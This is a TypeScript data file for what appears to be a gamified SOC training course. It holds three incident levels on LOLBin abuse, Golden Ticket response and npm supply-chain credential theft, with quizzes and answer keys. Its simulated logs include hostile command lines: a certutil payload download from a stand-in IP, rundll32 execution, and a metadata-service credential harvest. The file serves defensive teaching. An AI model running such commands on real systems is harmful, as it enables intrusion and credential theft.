import { LevelData } from '../types/cyber';

export const LEVELS_31_TO_45: Record<number, LevelData> = {
  35: {
    metadata: {
      id: 35,
      title: 'ZERO-DAY #7: Advanced Persistent Threat Infiltration',
      subtitle: 'Major Incident: Living-off-the-Land (LOLBins), Cobalt Beaconing & SIEM Triage',
      phaseId: 7,
      phaseTitle: 'Phase 7: SOC Operations & SIEM',
      category: 'soc_threat_detection',
      isBoss: true,
      bossTitle: 'ZERO-DAY #7: APT Infiltration & Beaconing',
      xpReward: 600,
      estimatedMinutes: 32,
      unlockedToolReward: 'Threat Hunting Suite',
      badgeReward: '🕵️ Threat Hunter'
    },
    theory: {
      concept: 'Zero-Day Boss Challenge: Advanced SOC Alert Correlation & Living-off-the-Land (LOLBin) Threat Hunting. An Advanced Persistent Threat (APT) breached an edge VPN gateway and bypassed traditional antivirus by utilizing legitimate signed Windows binaries (e.g. certutil.exe, mshta.exe, rundll32.exe) to execute in-memory Cobalt Strike beaconing.',
      explainLikeImNew: 'Imagine a burglar who does not carry crowbars or lockpicks. Instead, they walk into a house, pick up your own kitchen knives, use your own garage door remote, and wear your own house slippers. That is a Living-off-the-Land attack: using trusted system tools to carry out cyber espionage so antivirus scanners look the other way.',
      architecture: 'APT Attack Lifecycle: 1. Perimeter Credential Stuffing -> 2. Living-off-the-Land Execution (certutil -urlcache -split -f to download shellcode) -> 3. In-Memory Process Injection into spoolsv.exe -> 4. Jittered HTTPS Beaconing to Command & Control (C2) at periodic intervals (e.g. every 60s +/- 20% jitter).',
      technicalDetails: [
        'LOLBin Identification: certutil.exe used to decode base64 or download external files; mshta.exe executing inline VBScript; regsvr32.exe /s /u /i:http:// (Squiblydoo).',
        'Jitter Detection: Analyzing network connection intervals: a regular heartbeat with randomized jitter (e.g. 48s, 64s, 57s, 62s) indicates automated C2 beaconing.',
        'SIEM Correlation Query: Event 4688 WHERE ProcessName = "certutil.exe" AND CommandLine LIKE "%urlcache%".'
      ],
      securityPerspective: 'Signatures fail against LOLBins because the binaries are cryptographically signed by Microsoft. Defenders must detect anomalous process ancestry (e.g. Word spawning PowerShell, or IIS worker process spawning cmd.exe) and behavioral anomalies.',
      detectionIndicators: [
        'certutil.exe making external outbound HTTP connections.',
        'Periodic outbound HTTPS connections to untrusted domains with low variance (beaconing).',
        'Print Spooler (spoolsv.exe) initiating outbound network connections.'
      ],
      defensiveMeasures: [
        'Enforce Application Whitelisting via Windows Defender Application Control (WDAC) or AppLocker.',
        'Block or restrict command-line access for known high-risk LOLBins using Sysmon rules.'
      ],
      realWorldContext: {
        incidentTitle: 'SolarWinds SUNBURST Supply Chain Intrusion (2020)',
        whatHappened: 'Nation-state actors deployed a trojanized software update, waited for a multi-week dormancy period, then used legitimate Windows services and in-memory injection to execute low-and-slow beaconing for months without detection.',
        whatDefendersLearned: 'Behavioral analytics, parent-child process tree inspection, and egress beaconing detection are essential to detect stealthy APTs.'
      },
      investigationExample: {
        scenario: 'A SIEM alert flags certutil.exe downloading a file named "cert.cer" from an external IP 198.51.100.99. Two seconds later, rundll32.exe is spawned.',
        analystThoughtProcess: 'Certutil is a certificate utility, but administrators rarely use it to download files from raw internet IPs. Rundll32 executing immediately afterward indicates the file was an encrypted DLL.',
        keyTakeaway: 'Certutil downloading files from external IPs is an unambiguous indicator of LOLBin exploitation.'
      }
    },
    preLabAssessment: [
      {
        id: 'pre-35-1',
        question: 'What is a "Living-off-the-Land Binary" (LOLBin) in cyber attacks?',
        options: [
          'A legitimate, vendor-signed operating system binary abused by adversaries to execute malicious actions and evade signature detection',
          'A custom Linux worm written from scratch in Assembly',
          'A physical cable spliced underground',
          'An unformatted magnetic tape backup'
        ],
        correctIndex: 0,
        explanation: 'LOLBins are legitimate system tools (like certutil, mshta, powershell) already present on the victim OS, abused by attackers to blend in with normal administrative activity.'
      }
    ],
    simulation: {
      toolType: 'siem_correlation',
      title: 'SIEM Correlation Engine & Threat Hunting Console',
      instructions: 'Query the SIEM index for process creation events involving known LOLBins. Correlate timestamps with firewall egress sessions.',
      targetGoal: 'Identify the LOLBin process and C2 IP address.'
    },
    investigation: {
      firComplaint: {
        reportNumber: 'FIR-2026-ZD-035',
        date: '2026-09-29',
        organization: 'Global Satellite Navigation Agency',
        complainant: 'Threat Hunting Incident Team',
        summary: 'Proactive hunt across enterprise EDR telemetry discovered suspicious parent-child process execution on Domain Controller DC-02.',
        reportedImpact: 'Potential compromise of satellite orbital positioning keys.'
      },
      evidenceSources: [
        {
          name: 'SIEM Process Execution Correlation Log',
          type: 'endpoint',
          description: 'Sysmon / Event 4688 telemetry on DC-02.',
          logs: [
            {
              id: 'zd7-3501',
              timestamp: '04:15:10',
              eventType: 'Event 4688: Process Creation',
              system: 'DC-02',
              user: 'SYSTEM',
              details: 'Image: C:\\Windows\\System32\\certutil.exe | Command: certutil.exe -urlcache -split -f http://203.0.113.140/payload.enc C:\\Windows\\Temp\\payload.dll',
              severity: 'critical',
              isMalicious: true
            },
            {
              id: 'zd7-3502',
              timestamp: '04:15:15',
              eventType: 'Event 4688: Process Creation',
              system: 'DC-02',
              user: 'SYSTEM',
              details: 'Image: C:\\Windows\\System32\\rundll32.exe | Command: rundll32.exe C:\\Windows\\Temp\\payload.dll,StartRoutine',
              severity: 'critical',
              isMalicious: true
            },
            {
              id: 'zd7-3503',
              timestamp: '04:16:00',
              eventType: 'Process Injection (Sysmon Event 8)',
              system: 'DC-02',
              user: 'SYSTEM',
              details: 'SourceImage: rundll32.exe injected shellcode into TargetImage: C:\\Windows\\System32\\spoolsv.exe (Print Spooler)',
              severity: 'critical',
              isMalicious: true
            }
          ]
        },
        {
          name: 'Firewall Egress Beaconing Log',
          type: 'firewall',
          description: 'Egress HTTPS traffic originating from DC-02.',
          logs: [
            {
              id: 'zd7-fw-1',
              timestamp: '04:17:02',
              sourceIp: '10.0.0.2',
              destIp: '203.0.113.140',
              sourcePort: 49182,
              destPort: 443,
              eventType: 'Outbound Session (Jitter: 58s)',
              system: 'Edge-FW-01',
              details: 'TLS 1.3 Session to 203.0.113.140 (spoolsv.exe socket)',
              severity: 'critical',
              isMalicious: true
            }
          ]
        }
      ],
      investigationQuestions: [
        {
          id: 'zd7-q1',
          question: 'Which legitimate Windows binary (LOLBin) was abused by the attacker to download the external payload according to log zd7-3501?',
          type: 'single_choice',
          options: [
            'certutil.exe',
            'ping.exe',
            'calc.exe',
            'notepad.exe'
          ],
          correctAnswer: 'certutil.exe',
          explanation: 'Log zd7-3501 documents certutil.exe using -urlcache -split -f to download the malicious payload from http://203.0.113.140/payload.enc.',
          points: 100
        },
        {
          id: 'zd7-q2',
          question: 'Into which legitimate Windows system service process did the attacker inject their Cobalt Strike beacon shellcode?',
          type: 'single_choice',
          options: [
            'spoolsv.exe (Print Spooler Service)',
            'explorer.exe',
            'lsass.exe',
            'svchost.exe'
          ],
          correctAnswer: 'spoolsv.exe (Print Spooler Service)',
          explanation: 'Log zd7-3503 explicitly records Sysmon Event 8 showing rundll32.exe injecting code into TargetImage: spoolsv.exe.',
          points: 100
        }
      ]
    },
    finalQuiz: [
      {
        id: 'q35-1',
        question: 'Why does Cobalt Strike or adversary C2 beaconing implement random "jitter" between outbound connection intervals?',
        options: [
          'To evade automated SIEM and firewall frequency-detection algorithms that flag rigid periodic intervals',
          'To speed up CPU clock cycles',
          'To reduce bandwidth costs on the target server',
          'To format the hard drive in increments'
        ],
        correctIndex: 0,
        explanation: 'Jitter introduces randomized delays (e.g. 60s +/- 20%) to break mathematical periodicity that intrusion detection systems look for.'
      }
    ]
  },

  40: {
    metadata: {
      id: 40,
      title: 'ZERO-DAY #8: Full Enterprise IR Crisis',
      subtitle: 'Major Incident: Multi-Host Compromise, Real-Time Containment Decisions',
      phaseId: 8,
      phaseTitle: 'Phase 8: Incident Response Lifecycle',
      category: 'incident_response_lifecycle',
      isBoss: true,
      bossTitle: 'ZERO-DAY #8: Enterprise Multi-Host Crisis',
      xpReward: 650,
      estimatedMinutes: 35,
      badgeReward: '⚡ Incident Commander'
    },
    theory: {
      concept: 'Zero-Day Boss Challenge: Comprehensive Incident Response Lifecycle Execution (NIST SP 800-61 / SANS PICERL). An active intrusion is spreading across multiple corporate subnets. You must navigate real-time containment dilemmas with trade-offs between forensic evidence preservation and threat isolation, eradicate attacker persistence, and orchestrate safe recovery.',
      explainLikeImNew: 'You are now the Incident Commander in a cyber war room. The alarms are blaring, multiple computers are infected, and executives are demanding immediate answers. Every decision you make has real consequences: pulling the power plug stops the attack but destroys the memory evidence needed to track the hacker; leaving it running preserves evidence but risks data being stolen.',
      architecture: 'NIST Incident Response Steps: 1. Preparation (tools, policies) -> 2. Detection & Analysis (triage, scoping) -> 3. Containment (short-term vs long-term quarantine) -> 4. Eradication (eliminating root cause, backdoors, compromised accounts) -> 5. Recovery (restoring from clean state, validation) -> 6. Post-Incident Activity (Lessons Learned).',
      technicalDetails: [
        'Order of Volatility Trade-Off: Volatile memory (RAM) is lost immediately upon system shutdown. Network isolation (cutting Layer 3 routing while keeping host powered on) preserves RAM while neutralizing lateral movement.',
        'Golden Ticket Invalidation: Requires resetting the Active Directory krbtgt account password TWICE with a 10-hour interval between resets to clear Kerberos ticket cache replication.',
        'Eradication Verification: Checking all WMI event subscriptions, scheduled tasks, and rogue service installations before declaring clear.'
      ],
      securityPerspective: 'Premature eradication before full scoping causes attackers to simply switch to secondary dormant backdoors, rendering the containment effort useless.',
      detectionIndicators: [
        'Simultaneous outbound connections from multiple internal hosts to known bulletproof hosting ranges.',
        'Compromised domain admin accounts authenticating from unauthorized subnets.'
      ],
      defensiveMeasures: [
        'Maintain an isolated out-of-band communication channel for the incident response team (do not discuss IR over corporate email during an active breach).',
        'Deploy pre-configured host isolation scripts on all endpoint EDR agents.'
      ],
      realWorldContext: {
        incidentTitle: 'NotPetya Global Logistics Destruction (2017)',
        whatHappened: 'Worm-like malware spread across worldwide shipping corporate networks in minutes using EternalBlue and Mimikatz. Port terminals, shipping containers, and global trade were crippled because systems could not be isolated rapidly enough.',
        whatDefendersLearned: 'Automated network isolation playbooks and out-of-band response capabilities are critical for fast-moving enterprise worms.'
      },
      investigationExample: {
        scenario: 'The IR team needs to contain host WS-DEV-04. Option A is pulling the physical power cord. Option B is issuing an EDR software network isolation command.',
        analystThoughtProcess: 'Option A wipes RAM, destroying the encryption key and injected process memory. Option B severs network communication instantly while keeping RAM powered for live memory imaging.',
        keyTakeaway: 'Always prefer software network isolation over physical power disconnects whenever memory forensics are required.'
      }
    },
    preLabAssessment: [
      {
        id: 'pre-40-1',
        question: 'According to RFC 3227 Order of Volatility, which piece of digital evidence should be acquired FIRST during live incident triage?',
        options: ['Volatile System RAM and Active Network Sockets', 'Hard Disk Drive sectors', 'Optical DVD backups', 'Archival magnetic tapes'],
        correctIndex: 0,
        explanation: 'Volatile memory (registers, cache, RAM) is lost as soon as the system is powered off and must be preserved before persistent storage.'
      }
    ],
    simulation: {
      toolType: 'siem_correlation',
      title: 'Incident War Room & Consequence Decision Engine',
      instructions: 'Review multi-host telemetry across Workstations, Active Directory, and DMZ. Make high-stakes containment decisions and analyze the consequence trade-offs.',
      targetGoal: 'Select the optimal containment and eradication strategy.'
    },
    investigation: {
      firComplaint: {
        reportNumber: 'FIR-2026-ZD-040',
        date: '2026-09-29',
        organization: 'Apex Global Logistics & Shipping',
        complainant: 'Chief Executive Officer (CEO)',
        summary: 'CRISIS LEVEL 1: Active adversary detected traversing domain controllers. Shipping port cranes are experiencing automated software disconnections.',
        reportedImpact: 'Global maritime cargo operations at risk of complete freeze.'
      },
      evidenceSources: [
        {
          name: 'Multi-Host SOC Correlation Feed',
          type: 'network',
          description: 'Real-time telemetry across core infrastructure.',
          logs: [
            {
              id: 'zd8-4001',
              timestamp: '21:05:00',
              sourceIp: '10.10.5.22',
              destIp: '10.10.1.1',
              eventType: 'Golden Ticket Kerberos Request',
              system: 'DC-PRIMARY',
              user: 'Administrator',
              details: 'Kerberos TGS request with 10-year validity lifetime (Forged Kerberos Golden Ticket using krbtgt hash)',
              severity: 'critical',
              isMalicious: true
            },
            {
              id: 'zd8-4002',
              timestamp: '21:06:15',
              sourceIp: '10.10.5.22',
              destIp: '10.10.100.10',
              eventType: 'Port Crane SCADA Pivot Attempt',
              system: 'Core-FW-01',
              details: 'Inbound SMB Probe to Port Crane Industrial Controller 10.10.100.10. Status: Active Session established',
              severity: 'critical',
              isMalicious: true
            }
          ]
        }
      ],
      consequenceDecision: {
        prompt: 'The adversary is using a forged Kerberos Golden Ticket to pivot toward the Port Crane SCADA controllers. Which containment action do you order as Incident Commander?',
        options: [
          {
            id: 'ir-opt-1',
            label: 'Execute EDR network isolation on 10.10.5.22, sever the SCADA network link at the firewall, and reset the Active Directory KRBTGT password twice.',
            consequence: 'Threat actor immediately severed from SCADA controllers. Golden Tickets invalidated. Volatile memory preserved for triage. Optimal resolution!',
            forensicImpact: 0,
            containmentImpact: 100,
            isRecommended: true
          },
          {
            id: 'ir-opt-2',
            label: 'Power down the entire data center immediately without taking memory images.',
            consequence: 'Attack halted, but all volatile RAM evidence and encryption keys were destroyed. Root cause could not be determined. Massive uncoordinated recovery downtime.',
            forensicImpact: -50,
            containmentImpact: 40,
            isRecommended: false
          }
        ]
      },
      investigationQuestions: [
        {
          id: 'zd8-q1',
          question: 'What catastrophic persistence mechanism was utilized by the adversary on the Domain Controller in log zd8-4001?',
          type: 'single_choice',
          options: [
            'Forged Kerberos Golden Ticket (abusing the krbtgt account hash)',
            'Standard DNS A-record registration',
            'DHCP lease renewal',
            'ARP cache flush'
          ],
          correctAnswer: 'Forged Kerberos Golden Ticket (abusing the krbtgt account hash)',
          explanation: 'Log zd8-4001 documents a Kerberos request with an anomalous 10-year validity lifetime generated via a forged Golden Ticket.',
          points: 100
        }
      ]
    },
    finalQuiz: [
      {
        id: 'q40-1',
        question: 'Why must the Active Directory KRBTGT account password be reset twice in succession following a Golden Ticket compromise?',
        options: [
          'Because Active Directory maintains the previous password history for one cycle; resetting twice invalidates all existing Kerberos tickets completely',
          'To format the Domain Controller hard drive',
          'Because the first reset only changes the display name',
          'To switch from IPv4 to IPv6'
        ],
        correctIndex: 0,
        explanation: 'AD retains the current and previous krbtgt password hashes to allow ongoing sessions to finish. Resetting it twice purges the old hash, immediately invalidating all forged Golden Tickets.'
      }
    ]
  },

  45: {
    metadata: {
      id: 45,
      title: 'ZERO-DAY #9: Supply Chain & Multi-Vector Attack',
      subtitle: 'Major Incident: Malicious Dependency Package, AWS Key Harvest & DB Dump',
      phaseId: 9,
      phaseTitle: 'Phase 9: Web, Cloud & Insider Vectors',
      category: 'advanced_vectors_cloud_web',
      isBoss: true,
      bossTitle: 'ZERO-DAY #9: Supply Chain Multi-Vector Assault',
      xpReward: 700,
      estimatedMinutes: 38,
      badgeReward: '🔥 Zero-Day Solver'
    },
    theory: {
      concept: 'Zero-Day Boss Challenge: Modern Cloud Supply Chain Intrusion. The adversary compromised an open-source npm package maintainer account, injected a malicious pre-install script, extracted AWS Cloud IAM credentials from the build server metadata service (169.254.169.254), and exfiltrated customer database backups from an S3 bucket.',
      explainLikeImNew: 'Instead of attacking the castle walls, the adversary poisoned the flour before the baker made the bread. The company developers unknowingly installed an updated software library that had a hidden backdoor. As soon as the library was built, it stole the company cloud keys and emptied their cloud storage vault.',
      architecture: 'Supply Chain Vector: Poisoned Open-Source Dependency (NPM/PyPI) -> CI/CD Pipeline Execution -> SSRF / Metadata Credential Extraction (http://169.254.169.254/latest/meta-data/iam/security-credentials/) -> Cloud IAM Role Assumption -> AWS S3 Sync / Database Dump to external bucket.',
      technicalDetails: [
        'Instance Metadata Service (IMDS): IMDSv1 allowed unauthenticated HTTP GET requests to 169.254.169.254. IMDSv2 requires session tokens (PUT request with X-aws-ec2-metadata-token-ttl-seconds) to block SSRF exfiltration.',
        'AWS CloudTrail Event: GetObject / ListBucket / AssumeRole anomalies from unfamiliar external IP addresses.',
        'Package Lock Integrity: Discrepancy in package-lock.json integrity hashes (SHA-512) indicating upstream tampering.'
      ],
      securityPerspective: 'Supply chain attacks bypass perimeter firewalls because the code is imported and executed willingly by internal build servers. Once cloud credentials are stolen, adversaries operate directly inside cloud management APIs without touching internal networks.',
      detectionIndicators: [
        'Outbound HTTP connections from CI/CD runner environments to unknown foreign IP addresses during build steps.',
        'CloudTrail API calls originating from non-corporate, non-VPN IP addresses using instance profile credentials.'
      ],
      defensiveMeasures: [
        'Mandate IMDSv2 across all cloud compute instances (blocks single-hop SSRF).',
        'Implement automated Software Bill of Materials (SBOM) and private artifact package caching with hash pinning.'
      ],
      realWorldContext: {
        incidentTitle: 'Codecov Bash Uploader Supply Chain Breach (2021)',
        whatHappened: 'Attackers modified a bash script used by thousands of companies in their continuous integration pipelines to silently siphon customer environment variables, secret tokens, and cloud credentials back to an attacker server.',
        whatDefendersLearned: 'CI/CD pipelines must be treated as tier-0 infrastructure; dependencies and scripts must be pinned to immutable cryptographic hashes.'
      },
      investigationExample: {
        scenario: 'CloudTrail logs show an IAM Role assigned to a web server being used from an IP in Eastern Europe to download files from an S3 bucket named "apex-customer-pii-backups".',
        analystThoughtProcess: 'Instance profile roles should never be called from outside AWS. The temporary STS security credentials generated for the instance were exfiltrated via SSRF or supply chain backdoor.',
        keyTakeaway: 'External API calls using EC2 IAM Role credentials confirm metadata service credential theft.'
      }
    },
    preLabAssessment: [
      {
        id: 'pre-45-1',
        question: 'Which specific IP address is reserved across major cloud providers (AWS, Azure, GCP) as the link-local Instance Metadata Service (IMDS)?',
        options: ['169.254.169.254', '192.168.1.1', '127.0.0.1', '10.0.0.1'],
        correctIndex: 0,
        explanation: '169.254.169.254 is the standardized link-local IPv4 address used by cloud instances to query the metadata service and retrieve IAM credentials.'
      }
    ],
    simulation: {
      toolType: 'siem_correlation',
      title: 'CloudTrail & Dependency Audit Lab',
      instructions: 'Inspect npm build output logs and correlate AWS CloudTrail API calls for AssumeRole and S3 GetObject events.',
      targetGoal: 'Identify the poisoned dependency name and exfiltrated S3 bucket.'
    },
    investigation: {
      firComplaint: {
        reportNumber: 'FIR-2026-ZD-045',
        date: '2026-09-29',
        organization: 'Apex FinTech Global',
        complainant: 'Cloud Security Architect',
        summary: 'CloudTrail alert: 200 GB of customer credit records downloaded from S3 bucket by unknown IP using build runner IAM role.',
        reportedImpact: 'Catastrophic regulatory liability under GDPR/CCPA.'
      },
      evidenceSources: [
        {
          name: 'CI/CD Build Pipeline Terminal Log',
          type: 'endpoint',
          description: 'Console log from Jenkins build runner Runner-04.',
          logs: [
            {
              id: 'zd9-4501',
              timestamp: '16:40:11',
              eventType: 'npm install execution',
              system: 'Jenkins-Runner-04',
              details: 'Installing dependency: "crypt-format-utils@2.4.1" | Postinstall script executed: "node ./scripts/prebuild.js"',
              severity: 'medium',
              isDecoy: true
            },
            {
              id: 'zd9-4502',
              timestamp: '16:40:14',
              eventType: 'Metadata Service Query',
              system: 'Jenkins-Runner-04',
              details: 'HTTP GET http://169.254.169.254/latest/meta-data/iam/security-credentials/JenkinsRole | Status: 200 OK | Harvested: AccessKeyId, SecretAccessKey, Token',
              severity: 'critical',
              isMalicious: true
            }
          ]
        },
        {
          name: 'AWS CloudTrail Event Log',
          type: 'endpoint',
          description: 'CloudTrail management audit logs.',
          logs: [
            {
              id: 'zd9-4503',
              timestamp: '16:42:00',
              eventType: 'S3 Sync / Data Exfiltration',
              system: 'AWS-CloudTrail',
              user: 'JenkinsRole (Exfiltrated Token)',
              sourceIp: '198.51.100.222',
              details: 'EventName: ListObjectsV2 | BucketName: "apex-production-credit-vault" | 15,400 objects downloaded to external IP 198.51.100.222',
              severity: 'critical',
              isMalicious: true
            }
          ]
        }
      ],
      investigationQuestions: [
        {
          id: 'zd9-q1',
          question: 'How did the poisoned npm package exfiltrate cloud IAM credentials from the build server according to log zd9-4502?',
          type: 'single_choice',
          options: [
            'By querying the link-local cloud metadata service at http://169.254.169.254/latest/meta-data/',
            'By sniffing Wi-Fi radio frequencies',
            'By bruteforcing the root AWS password',
            'By intercepting physical mail'
          ],
          correctAnswer: 'By querying the link-local cloud metadata service at http://169.254.169.254/latest/meta-data/',
          explanation: 'The malicious script queried the unauthenticated IMDSv1 endpoint at 169.254.169.254, stealing the IAM role credentials associated with the build server.',
          points: 100
        },
        {
          id: 'zd9-q2',
          question: 'Which sensitive S3 bucket was targeted and exfiltrated by the attacker using the stolen JenkinsRole credentials?',
          type: 'single_choice',
          options: [
            'apex-production-credit-vault',
            'public-marketing-assets',
            'static-css-bundle',
            'empty-temp-cache'
          ],
          correctAnswer: 'apex-production-credit-vault',
          explanation: 'CloudTrail log zd9-4503 explicitly identifies BucketName: "apex-production-credit-vault" with 15,400 customer records downloaded.',
          points: 100
        }
      ]
    },
    finalQuiz: [
      {
        id: 'q45-1',
        question: 'Which cloud configuration change directly prevents SSRF attacks from stealing credentials via the metadata service at 169.254.169.254?',
        options: [
          'Enforcing IMDSv2 (requiring session tokens via HTTP PUT) and setting hop limit to 1',
          'Changing the root account password',
          'Enabling dark mode on the AWS console',
          'Deleting the VPC subnet'
        ],
        correctIndex: 0,
        explanation: 'IMDSv2 requires a secret session token obtained via HTTP PUT with custom headers, neutralizing standard SSRF attacks.'
      }
    ]
  }
};
